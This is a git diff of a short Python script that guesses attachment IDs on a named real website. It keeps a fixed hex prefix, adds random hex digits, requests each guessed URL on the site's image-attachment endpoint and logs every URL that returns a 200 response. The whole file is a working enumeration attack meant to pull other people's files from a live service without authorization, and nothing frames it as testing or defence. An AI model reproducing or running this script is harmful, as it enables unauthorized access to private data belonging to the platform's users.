@@ -1,20 +1,22 @@
 import random
 import requests
+count = 100
+data="61b30bb75db81f3105c0d5" #static hexvalue
+data_length = 24
 file_name = "junk.txt" #change name if needed
 murl = "https://www.mycamu.co.in/image_attachment/get/" #main url
-def generate_hex_string(l): #static+dynamic=24hexdigits needed to crack 
+def generate_hex_string(data,tlen): #static+dynamic=24hexdigits needed to crack 
     hex_chars = '0123456789ABCDEF'
-    
-    
-    data="61b30bb75db81f3105c0" #static hexvalue
-    for i in range(l):
-        data+=random.choice(hex_chars)
+    if(len(data) < tlen):
+        l = tlen-len(data)
+        for i in range(l):
+            data+=random.choice(hex_chars)
     return data
     
 def remove_duplicates(input_file, output_file):
     lines_seen = set()  # To keep track of unique lines
 
-    with open(input_file, 'r') as input_f, open(output_file, 'a') as output_f:
+    with open(input_file, 'r') as input_f, open(output_file, 'w') as output_f:
         for line in input_f:
             line = line.strip()  # Remove leading/trailing whitespaces
             if line not in lines_seen:
@@ -22,11 +24,9 @@ def remove_duplicates(input_file, output_file):
                 lines_seen.add(line)
 
 
-
-len = 4 #dynamic hexvalue length
 with open(file_name, "a") as f: 
-    for hex_num in range(10000):
-        d = generate_hex_string(len)
+    for hex_num in range(count):
+        d = generate_hex_string(data,data_length)
         curl=murl+d #custom url
         response = requests.get(curl)
         if(response.status_code == 200):
@@ -34,7 +34,7 @@ with open(file_name, "a") as f:
              print("(SUCCESS : 200ok)=> "+curl)
         
         else: #if error needed implement 
-            print("NOT FOUND")
+            print("NULL")
             
             
             
